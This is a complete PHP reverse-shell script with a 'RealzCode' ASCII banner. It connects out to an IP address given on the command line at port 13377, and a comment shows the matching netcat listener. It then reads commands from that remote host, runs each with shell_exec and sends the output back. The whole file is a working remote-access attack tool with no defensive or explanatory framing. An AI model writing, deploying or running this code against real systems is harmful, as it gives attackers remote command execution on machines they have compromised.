#!/usr/bin/php
<?php
$we = "  _____            _      _____          _      
 |  __ \          | |    / ____|        | |     
 | |__) |___  __ _| |___| |     ___   __| | ___ 
 |  _  // _ \/ _` | |_  / |    / _ \ / _` |/ _ \
 | | \ \  __/ (_| | |/ /| |___| (_) | (_| |  __/
 |_|  \_\___|\__,_|_/___|\_____\___/ \__,_|\___|
";

$po = 13377; // nc -l -p 13377
set_time_limit($po);

if (isset($argv[1])) {
    $ip = $argv[1];
} else {
    echo "Please provide the IP address as a command-line argument.\n";
    exit(1);
}

$clientIp = gethostbyname(gethostname());
$we .= "Client IP: $clientIp\n";

$sock = @fsockopen($ip, $po, $errno, $errstr);
if ($errno != 0) {
    echo "$errno:$errstr";
} elseif (!$sock) {
    exit();
} else {
    echo "$ip:$po\n";
    fwrite($sock, "$we\n");
    
    while (!feof($sock)) {
        fwrite($sock, "$ ");
        $cmd = fgets($sock, $po);
        
        if (!empty($cmd)) {
            $output = '';
            $cmd = trim($cmd);
            
            if ($cmd === 'exit') {
                fclose($sock);
                exit();
            } else {
                $output = shell_exec($cmd);
            }
            
            fwrite($sock, $output);
        }
    }
    
    fclose($sock);
}
